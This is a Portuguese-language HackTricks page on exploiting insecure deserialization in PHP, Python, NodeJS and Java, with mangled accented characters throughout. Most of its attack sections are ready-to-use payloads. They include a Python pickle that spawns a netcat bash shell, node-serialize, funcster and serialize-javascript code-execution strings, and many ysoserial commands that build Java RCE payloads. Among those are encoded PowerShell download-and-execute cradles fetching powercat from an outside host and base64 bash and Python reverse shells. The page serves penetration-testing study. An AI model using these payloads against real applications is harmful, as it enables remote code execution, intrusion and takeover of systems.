# Desserializa√ß√£o

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Informa√ß√£o B√°sica

**Serializa√ß√£o** √© entendida como o m√©todo de converter um objeto em um formato que pode ser preservado, com a inten√ß√£o de armazenar o objeto ou transmiti-lo como parte de um processo de comunica√ß√£o. Essa t√©cnica √© comumente empregada para garantir que o objeto possa ser recriado em um momento posterior, mantendo sua estrutura e estado.

**Desserializa√ß√£o**, por outro lado, √© o processo que contraria a serializa√ß√£o. Envolve pegar dados que foram estruturados em um formato espec√≠fico e reconstru√≠-los de volta em um objeto.

A desserializa√ß√£o pode ser perigosa porque potencialmente **permite que atacantes manipulem os dados serializados para executar c√≥digo malicioso** ou causar comportamentos inesperados na aplica√ß√£o durante o processo de reconstru√ß√£o do objeto.

## PHP

No PHP, m√©todos m√°gicos espec√≠ficos s√£o utilizados durante os processos de serializa√ß√£o e desserializa√ß√£o:

* `__sleep`: Invocado quando um objeto est√° sendo serializado. Este m√©todo deve retornar um array com os nomes de todas as propriedades do objeto que devem ser serializadas. √â comumente usado para confirmar dados pendentes ou realizar tarefas de limpeza semelhantes.
* `__wakeup`: Chamado quando um objeto est√° sendo desserializado. √â usado para restabelecer quaisquer conex√µes de banco de dados que possam ter sido perdidas durante a serializa√ß√£o e realizar outras tarefas de reinicializa√ß√£o.
* `__unserialize`: Este m√©todo √© chamado em vez de `__wakeup` (se existir) quando um objeto est√° sendo desserializado. Ele oferece mais controle sobre o processo de desserializa√ß√£o em compara√ß√£o com `__wakeup`.
* `__destruct`: Este m√©todo √© chamado quando um objeto est√° prestes a ser destru√≠do ou quando o script termina. Geralmente √© usado para tarefas de limpeza, como fechar manipuladores de arquivos ou conex√µes de banco de dados.
* `__toString`: Este m√©todo permite que um objeto seja tratado como uma string. Pode ser usado para ler um arquivo ou outras tarefas com base nas chamadas de fun√ß√£o dentro dele, fornecendo efetivamente uma representa√ß√£o textual do objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Se voc√™ olhar para os resultados, pode ver que as fun√ß√µes **`__wakeup`** e **`__destruct`** s√£o chamadas quando o objeto √© desserializado. Note que em v√°rios tutoriais voc√™ encontrar√° que a fun√ß√£o **`__toString`** √© chamada ao tentar imprimir algum atributo, mas aparentemente isso **n√£o est√° mais acontecendo**.

{% hint style="warning" %}
O m√©todo **`__unserialize(array $data)`** √© chamado **em vez de `__wakeup()`** se estiver implementado na classe. Isso permite desserializar o objeto fornecendo os dados serializados como um array. Voc√™ pode usar esse m√©todo para desserializar propriedades e realizar quaisquer tarefas necess√°rias durante a desserializa√ß√£o.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Voc√™ pode ler um exemplo **PHP explicado aqui**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqui [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou aqui [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Voc√™ poderia abusar da funcionalidade de autoload do PHP para carregar arquivos PHP arbitr√°rios e mais:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Se por algum motivo voc√™ deseja serializar um valor como uma **refer√™ncia a outro valor serializado** voc√™ pode:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) pode ajud√°-lo a gerar payloads para abusar de desserializa√ß√µes em PHP.\
Note que em v√°rios casos voc√™ **n√£o conseguir√° encontrar uma maneira de abusar de uma desserializa√ß√£o no c√≥digo-fonte** da aplica√ß√£o, mas voc√™ pode ser capaz de **abusar do c√≥digo de extens√µes PHP externas.**\
Portanto, se poss√≠vel, verifique o `phpinfo()` do servidor e **pesquise na internet** (e at√© nos **gadgets** do **PHPGGC**) alguns poss√≠veis gadgets que voc√™ poderia abusar.

### Desserializa√ß√£o de metadados phar://

Se voc√™ encontrou uma LFI que est√° apenas lendo o arquivo e n√£o executando o c√≥digo PHP dentro dele, por exemplo, usando fun√ß√µes como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_. Voc√™ pode tentar abusar de uma **desserializa√ß√£o** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informa√ß√µes, leia o seguinte post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Quando o objeto √© desempacotado, a fun√ß√£o _\_\_reduce\_\__ ser√° executada.\
Quando explorado, o servidor pode retornar um erro.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Para obter mais informa√ß√µes sobre como escapar das **cadeias de pickle**, verifique:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

A seguinte p√°gina apresenta a t√©cnica de **abusar da desserializa√ß√£o insegura em bibliotecas python yamls** e termina com uma ferramenta que pode ser usada para gerar carga √∫til de desserializa√ß√£o RCE para **Pickle, PyYAML, jsonpickle e ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Polui√ß√£o de Classe (Polui√ß√£o de Prot√≥tipo Python)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Fun√ß√µes M√°gicas JS

O JS **n√£o possui fun√ß√µes "m√°gicas"** como PHP ou Python que ser√£o executadas apenas para criar um objeto. Mas possui algumas **fun√ß√µes** que s√£o **frequentemente usadas mesmo sem serem chamadas diretamente** como **`toString`**, **`valueOf`**, **`toJSON`**.\
Ao abusar de uma desserializa√ß√£o, voc√™ pode **comprometer essas fun√ß√µes para executar outro c√≥digo** (potencialmente abusando de polui√ß√µes de prot√≥tipo) e poder√° executar c√≥digo arbitr√°rio quando elas forem chamadas.

Outra **forma "m√°gica" de chamar uma fun√ß√£o** sem cham√°-la diretamente √© **comprometer um objeto que √© retornado por uma fun√ß√£o ass√≠ncrona** (promessa). Porque, se voc√™ **transformar** esse **objeto retornado** em outra **promessa** com uma **propriedade** chamada **"then" do tipo fun√ß√£o**, ela ser√° **executada** apenas porque √© retornada por outra promessa. _Siga_ [_**este link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para mais informa√ß√µes._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Polui√ß√£o de `__proto__` e `prototype`

Se voc√™ deseja aprender sobre essa t√©cnica, **d√™ uma olhada no seguinte tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Essa biblioteca permite serializar fun√ß√µes. Exemplo:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
O **objeto serializado** ter√° a seguinte apar√™ncia:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Pode ver no exemplo que quando uma fun√ß√£o √© serializada, a flag `_$$ND_FUNC$$_` √© anexada ao objeto serializado.

Dentro do arquivo `node-serialize/lib/serialize.js`, voc√™ pode encontrar a mesma flag e como o c√≥digo a est√° utilizando.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Como pode ver no √∫ltimo trecho de c√≥digo, **se a flag for encontrada**, `eval` √© usado para desserializar a fun√ß√£o, ent√£o basicamente **a entrada do usu√°rio est√° sendo usada dentro da fun√ß√£o `eval`**.

No entanto, **apenas serializar** uma fun√ß√£o **n√£o a executar√°**, pois seria necess√°rio que alguma parte do c√≥digo estivesse **chamando `y.rce`** em nosso exemplo e isso √© altamente **improv√°vel**.\
De qualquer forma, voc√™ poderia simplesmente **modificar o objeto serializado** **adicionando alguns par√™nteses** para executar automaticamente a fun√ß√£o serializada quando o objeto for desserializado.\
No pr√≥ximo trecho de c√≥digo, **observe o √∫ltimo par√™ntese** e como a fun√ß√£o `unserialize` executar√° automaticamente o c√≥digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como foi indicado anteriormente, esta biblioteca ir√° obter o c√≥digo ap√≥s `_$$ND_FUNC$$_` e ir√° **execut√°-lo** usando `eval`. Portanto, para **auto-executar c√≥digo**, voc√™ pode **excluir a parte de cria√ß√£o da fun√ß√£o** e o √∫ltimo par√™ntese e **apenas executar um JS oneliner** como no exemplo a seguir:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Pode [**encontrar aqui**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **mais informa√ß√µes** sobre como explorar essa vulnerabilidade.

### [funcster](https://www.npmjs.com/package/funcster)

Um aspecto not√°vel do **funcster** √© a inacessibilidade dos **objetos internos padr√£o**; eles est√£o fora do escopo acess√≠vel. Essa restri√ß√£o impede a execu√ß√£o de c√≥digo que tenta invocar m√©todos em objetos internos, levando a exce√ß√µes como `"ReferenceError: console is not defined"` quando comandos como `console.log()` ou `require(something)` s√£o usados.

Apesar dessa limita√ß√£o, a restaura√ß√£o do acesso total ao contexto global, incluindo todos os objetos internos padr√£o, √© poss√≠vel por meio de uma abordagem espec√≠fica. Ao alavancar o contexto global diretamente, √© poss√≠vel contornar essa restri√ß√£o. Por exemplo, o acesso pode ser restabelecido usando o seguinte trecho:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para** [**mais informa√ß√µes leia esta fonte**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

O pacote **serialize-javascript** √© projetado exclusivamente para fins de serializa√ß√£o, sem quaisquer capacidades de desserializa√ß√£o embutidas. Os usu√°rios s√£o respons√°veis por implementar seu pr√≥prio m√©todo para desserializa√ß√£o. Um uso direto do `eval` √© sugerido pelo exemplo oficial para desserializar dados serializados:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Se esta fun√ß√£o for usada para desserializar objetos, voc√™ pode **explor√°-la facilmente**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para** [**mais informa√ß√µes leia esta fonte**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteca Cryo

Nas p√°ginas a seguir, voc√™ pode encontrar informa√ß√µes sobre como abusar dessa biblioteca para executar comandos arbitr√°rios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

No Java, **callbacks de desserializa√ß√£o s√£o executados durante o processo de desserializa√ß√£o**. Essa execu√ß√£o pode ser explorada por atacantes que criam payloads maliciosos que acionam esses callbacks, levando √† execu√ß√£o potencial de a√ß√µes prejudiciais.

### Impress√µes Digitais

#### Caixa Branca

Para identificar poss√≠veis vulnerabilidades de serializa√ß√£o no c√≥digo-fonte, procure por:

* Classes que implementam a interface `Serializable`.
* Uso de `java.io.ObjectInputStream`, fun√ß√µes `readObject`, `readUnshare`.

Preste aten√ß√£o especial em:

* `XMLDecoder` utilizado com par√¢metros definidos por usu√°rios externos.
* M√©todo `fromXML` do `XStream`, especialmente se a vers√£o do XStream for menor ou igual a 1.46, pois √© suscet√≠vel a problemas de serializa√ß√£o.
* `ObjectInputStream` acoplado ao m√©todo `readObject`.
* Implementa√ß√£o de m√©todos como `readObject`, `readObjectNodData`, `readResolve` ou `readExternal`.
* `ObjectInputStream.readUnshared`.
* Uso geral de `Serializable`.

#### Caixa Preta

Para testes de caixa preta, procure por **assinaturas ou "Bytes M√°gicos"** espec√≠ficos que denotam objetos serializados em java (originados de `ObjectInputStream`):

* Padr√£o hexadecimal: `AC ED 00 05`.
* Padr√£o Base64: `rO0`.
* Cabe√ßalhos de resposta HTTP com `Content-type` definido como `application/x-java-serialized-object`.
* Padr√£o hexadecimal indicando compress√£o anterior: `1F 8B 08 00`.
* Padr√£o Base64 indicando compress√£o anterior: `H4sIA`.
* Arquivos da web com a extens√£o `.faces` e o par√¢metro `faces.ViewState`. Descobrir esses padr√µes em uma aplica√ß√£o web deve motivar uma an√°lise detalhada conforme descrito no [post sobre Desserializa√ß√£o de ViewState Java JSF](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar se √© vulner√°vel

Se voc√™ deseja **aprender como funciona uma explora√ß√£o de desserializa√ß√£o Java**, voc√™ deve dar uma olhada em [**Deserializa√ß√£o Java B√°sica**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializa√ß√£o Java DNS**](java-dns-deserialization-and-gadgetprobe.md) e [**Carga √ötil CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Teste de Caixa Branca

Voc√™ pode verificar se h√° alguma aplica√ß√£o instalada com vulnerabilidades conhecidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Voc√™ poderia tentar **verificar todas as bibliotecas** conhecidas por serem vulner√°veis e para as quais o [**Ysoserial**](https://github.com/frohoff/ysoserial) pode fornecer um exploit. Ou voc√™ poderia verificar as bibliotecas indicadas no [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Voc√™ tamb√©m pode usar o [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para procurar poss√≠veis cadeias de gadgets que podem ser exploradas.\
Ao executar o **gadgetinspector** (ap√≥s constru√≠-lo), n√£o se preocupe com a quantidade de avisos/erros que ele est√° passando e deixe-o terminar. Ele escrever√° todas as descobertas em _gadgetinspector/gadget-results/gadget-chains-ano-m√™s-dia-hora-minuto.txt_. Por favor, note que o **gadgetinspector n√£o criar√° um exploit e pode indicar falsos positivos**.

#### Teste de Caixa Preta

Usando a extens√£o do Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) voc√™ pode identificar **quais bibliotecas est√£o dispon√≠veis** (e at√© mesmo as vers√µes). Com essa informa√ß√£o, poderia ser **mais f√°cil escolher um payload** para explorar a vulnerabilidade.\
[**Leia mais sobre o GadgetProbe aqui**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
O GadgetProbe √© focado em **desserializa√ß√µes do `ObjectInputStream`**.

Usando a extens√£o do Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) voc√™ pode **identificar bibliotecas vulner√°veis** explor√°veis com ysoserial e **explor√°-las**.\
[**Leia mais sobre o Java Deserialization Scanner aqui.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
O Java Deserialization Scanner √© focado em desserializa√ß√µes do **`ObjectInputStream`**.

Voc√™ tamb√©m pode usar o [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de desserializa√ß√£o** no **Burp**. Este plugin detectar√° vulnerabilidades relacionadas n√£o apenas ao **`ObjectInputStream`**, mas tamb√©m a bibliotecas de desserializa√ß√£o **Json** e **Yml**. No modo ativo, ele tentar√° confirm√°-las usando payloads de sleep ou DNS.\
[**Voc√™ pode encontrar mais informa√ß√µes sobre o Freddy aqui.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Teste de Serializa√ß√£o**

N√£o se trata apenas de verificar se alguma biblioteca vulner√°vel est√° sendo usada pelo servidor. √Äs vezes, voc√™ pode ser capaz de **alterar os dados dentro do objeto serializado e contornar algumas verifica√ß√µes** (talvez concedendo privil√©gios de administrador dentro de um aplicativo da web).\
Se voc√™ encontrar um objeto serializado Java sendo enviado para um aplicativo da web, **voc√™ pode usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir em um formato mais leg√≠vel para humanos o objeto de serializa√ß√£o que est√° sendo enviado**. Saber quais dados voc√™ est√° enviando facilitaria a modifica√ß√£o e contornaria algumas verifica√ß√µes.

### **Exploit**

#### **ysoserial**

A principal ferramenta para explorar desserializa√ß√µes Java √© o [**ysoserial**](https://github.com/frohoff/ysoserial) ([**baixe aqui**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Voc√™ tamb√©m pode considerar usar o [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), que permitir√° o uso de comandos complexos (com pipes, por exemplo).\
Observe que esta ferramenta √© **centrada** em explorar o **`ObjectInputStream`**.\
Eu come√ßaria usando o payload "URLDNS" **antes de um payload RCE** para testar se a inje√ß√£o √© poss√≠vel. De qualquer forma, observe que talvez o payload "URLDNS" n√£o esteja funcionando, mas outro payload RCE sim.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Ao criar um payload para **java.lang.Runtime.exec()** voc√™ **n√£o pode usar caracteres especiais** como ">" ou "|" para redirecionar a sa√≠da de uma execu√ß√£o, "$()" para executar comandos ou at√© mesmo **passar argumentos** para um comando separados por **espa√ßos** (voc√™ pode fazer `echo -n "hello world"` mas n√£o pode fazer `python2 -c 'print "Hello world"'`). Para codificar corretamente o payload, voc√™ pode [usar esta p√°gina da web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Sinta-se √† vontade para usar o script a seguir para criar **todos os poss√≠veis payloads de execu√ß√£o de c√≥digo** para Windows e Linux e ent√£o test√°-los na p√°gina da web vulner√°vel:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Voc√™ pode **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **juntamente com ysoserial para criar mais exploits**. Mais informa√ß√µes sobre essa ferramenta nos **slides da palestra** onde a ferramenta foi apresentada: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) pode ser usado para gerar payloads para explorar diferentes bibliotecas de serializa√ß√£o **Json** e **Yml** em Java.\
Para compilar o projeto, eu precisei **adicionar** essas **depend√™ncias** ao `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instale o Maven** e **compile** o projeto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Saiba mais sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laborat√≥rios

* Se voc√™ deseja testar alguns payloads ysoserial, voc√™ pode **executar este aplicativo da web**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por que

O Java utiliza bastante a serializa√ß√£o para diversos fins, como:

* **Requisi√ß√µes HTTP**: A serializa√ß√£o √© amplamente utilizada na gest√£o de par√¢metros, ViewState, cookies, etc.
